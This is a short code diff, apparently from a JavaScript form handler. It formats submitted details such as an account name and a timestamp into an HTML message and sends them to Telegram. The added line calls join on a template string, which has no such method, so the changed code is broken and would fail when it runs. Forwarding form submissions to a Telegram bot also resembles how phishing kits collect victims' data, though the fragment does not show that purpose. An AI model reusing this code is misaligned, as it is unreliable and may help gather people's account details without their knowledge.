@@ -146,7 +146,7 @@ const accountNameLine = accountName ? `<b>Account Name:</b> ${accountName}` : ''
  ${accountNameLine}
 
 🕒 <b>Submitted at:</b> ${new Date().toLocaleString()}
-        `.trim().replace(/\n\n+/, '\n');
+        `.join('\n').trim();
 
         // Send text data to Telegram
         await sendTextToTelegram(formattedText);
